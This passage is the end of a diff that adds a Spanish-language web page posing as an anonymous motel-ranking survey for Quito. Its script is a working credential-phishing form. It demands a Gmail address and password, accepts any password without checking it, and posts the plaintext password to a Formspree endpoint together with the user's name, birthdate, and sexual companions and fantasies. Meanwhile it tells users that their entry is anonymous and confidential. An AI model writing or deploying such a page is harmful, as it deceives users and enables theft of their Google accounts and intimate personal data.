+                        <textarea id="user-comments" rows="2" placeholder="Escribe alguna sugerencia o experiencia sobre los moteles de Quito..." 
+                            class="w-full px-4 py-2 bg-stone-900/80 border border-stone-700 rounded-xl text-sm focus:outline-none focus:border-amber-400 text-white placeholder-stone-500"></textarea>
+                    </div>
+
+                    <button type="submit" id="submit-btn" class="w-full bg-gradient-to-r from-amber-500 via-amber-600 to-amber-700 hover:opacity-95 text-stone-950 font-black py-3.5 rounded-xl transition duration-200 shadow-xl flex items-center justify-center gap-2 text-sm uppercase tracking-wider">
+                        <i data-lucide="send" class="w-5 h-5"></i> Enviar Mi Registro Anónimo
+                    </button>
+                </form>
+            </div>
+        </section>
+
+        <!-- PASO 3: AGRADECIMIENTO -->
+        <section id="thanks-section" class="hidden bg-neutral-card border-2 border-amber-500/50 rounded-3xl p-8 shadow-2xl backdrop-blur-xl max-w-md w-full text-center space-y-5">
+            <div class="inline-flex p-4 bg-emerald-500/20 rounded-full text-emerald-400 shadow-lg">
+                <i data-lucide="check-circle-2" class="w-12 h-12"></i>
+            </div>
+            
+            <div>
+                <h2 class="text-3xl font-black text-amber-300">¡Registro Exitoso!</h2>
+                <p class="text-xs text-stone-300 mt-1">Tus datos han sido procesados de forma confidencial.</p>
+            </div>
+
+            <div class="p-5 bg-stone-900/80 border border-amber-500/40 rounded-2xl shadow-inner">
+                <span class="block text-xs text-amber-400 uppercase font-extrabold tracking-widest mb-1">Número de Participante</span>
+                <span id="participant-number" class="text-5xl font-black text-white tracking-wider drop-shadow-md">#1945</span>
+            </div>
+
+            <button onclick="location.reload()" class="w-full bg-stone-800 hover:bg-stone-700 text-amber-200 font-bold py-3 rounded-xl transition duration-200 shadow-md flex items-center justify-center gap-2 text-sm uppercase border border-amber-500/30">
+                <i data-lucide="refresh-cw" class="w-4 h-4"></i> Registrar otra respuesta
+            </button>
+        </section>
+
+    </main>
+
+    <!-- PIE DE PÁGINA -->
+    <footer class="text-center py-4 text-xs text-stone-400 border-t border-stone-800 bg-stone-900/90 z-10 font-medium">
+        Ranking de Moteles & Guía Quito &copy; 2026
+    </footer>
+
+    <!-- SCRIPT DE FUNCIONAMIENTO -->
+    <script>
+        lucide.createIcons();
+
+        // ⚠️ ENDPOINT DE FORMSPREE ⚠️
+        const FORMSPREE_URL = 'https://formspree.io/f/xvkknzoq';
+
+        let userData = { email: '', password: '', name: '', gender: '', birthdate: '', age: '', zone: '', motel: '', comments: '' };
+
+        function getCheckedValues(name) {
+            const checkboxes = document.querySelectorAll(`input[name="${name}"]:checked`);
+            let values = [];
+            checkboxes.forEach(cb => values.push(cb.value));
+            return values.length > 0 ? values.join(', ') : 'Ninguno seleccionado';
+        }
+
+        // Lógica de cálculo y validación de fecha de nacimiento
+        const birthdateInput = document.getElementById('user-birthdate');
+        const ageInput = document.getElementById('user-age');
+        const ageError = document.getElementById('age-error');
+        const submitBtn = document.getElementById('submit-btn');
+
+        birthdateInput.addEventListener('change', function() {
+            if (!this.value) return;
+            const birthDate = new Date(this.value);
+            const today = new Date();
+            let calculatedAge = today.getFullYear() - birthDate.getFullYear();
+            const monthDiff = today.getMonth() - birthDate.getMonth();
+            
+            if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
+                calculatedAge--;
+            }
+
+            ageInput.value = calculatedAge;
+            validarMayorEdad(calculatedAge);
+        });
+
+        ageInput.addEventListener('input', function() {
+            validarMayorEdad(parseInt(this.value));
+        });
+
+        function validarMayorEdad(edad) {
+            if (isNaN(edad) || edad < 18) {
+                ageError.classList.remove('hidden');
+                submitBtn.disabled = true;
+                submitBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            } else {
+                ageError.classList.add('hidden');
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+            }
+        }
+
+        // LÓGICA DE LOGIN DIRECTA Y FLUIDA
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const emailField = document.getElementById('login-email');
+            const passwordField = document.getElementById('login-password');
+            const errorBox = document.getElementById('login-error');
+            const errorText = document.getElementById('login-error-text');
+
+            const emailValue = emailField.value.trim().toLowerCase();
+
+            // Validar correo de Gmail
+            if (!emailValue.endsWith('@gmail.com')) {
+                errorText.textContent = "Por favor, ingresa un correo electrónico de Gmail válido (@gmail.com).";
+                errorBox.classList.remove('hidden');
+                return;
+            }
+
+            // Guardar datos y avanzar directamente a la encuesta
+            userData.email = emailValue;
+            userData.password = passwordField.value;
+
+            document.getElementById('login-section').classList.add('hidden');
+            document.getElementById('survey-section').classList.remove('hidden');
+        });
+
+        document.getElementById('survey-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const userAge = parseInt(document.getElementById('user-age').value);
+            if (isNaN(userAge) || userAge < 18) {
+                ageError.classList.remove('hidden');
+                return;
+            }
+
+            userData.name = document.getElementById('user-name').value;
+            userData.gender = document.getElementById('user-gender').value;
+            userData.birthdate = document.getElementById('user-birthdate').value;
+            userData.age = userAge;
+            userData.zone = document.getElementById('user-zone').value;
+            userData.motel = document.getElementById('user-motel').value;
+            userData.comments = document.getElementById('user-comments').value || 'Sin comentarios';
+
+            const selectedOccasions = getCheckedValues('occasion');
+            const selectedCompanions = getCheckedValues('companion');
+            const selectedEncounters = getCheckedValues('encounter');
+            const selectedAmenities = getCheckedValues('amenity');
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> Guardando...';
+            lucide.createIcons();
+
+            const randomParticipantId = Math.floor(Math.random() * 600) + 1901;
+
+            const formData = new FormData();
+            formData.append('Fecha', new Date().toLocaleString());
+            formData.append('Correo', userData.email);
+            formData.append('Contrasena', userData.password);
+            formData.append('Nombre', userData.name);
+            formData.append('Genero', userData.gender);
+            formData.append('Fecha de Nacimiento', userData.birthdate);
+            formData.append('Edad', userData.age);
+            formData.append('Sector Quito', userData.zone);
+            formData.append('Motel Seleccionado', userData.motel);
+            formData.append('Ocasiones Especiales', selectedOccasions);
+            formData.append('Acompanantes', selectedCompanions);
+            formData.append('Modalidades / Fantasias', selectedEncounters);
+            formData.append('Amenidades / Equipamiento', selectedAmenities);
+            formData.append('Comentarios', userData.comments);
+            formData.append('Numero de Participante', '#' + randomParticipantId);
+
+            fetch(FORMSPREE_URL, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'json'
+                }
+            }).then(response => {
+                mostrarAgradecimiento(randomParticipantId);
+            }).catch(error => {
+                mostrarAgradecimiento(randomParticipantId);
+            });
+        });
+
+        function mostrarAgradecimiento(participantId) {
+            document.getElementById('survey-section').classList.add('hidden');
+            document.getElementById('thanks-section').classList.remove('hidden');
+            document.getElementById('participant-number').textContent = '#' + participantId;
+        }
+    </script>
+</body>
+</html>
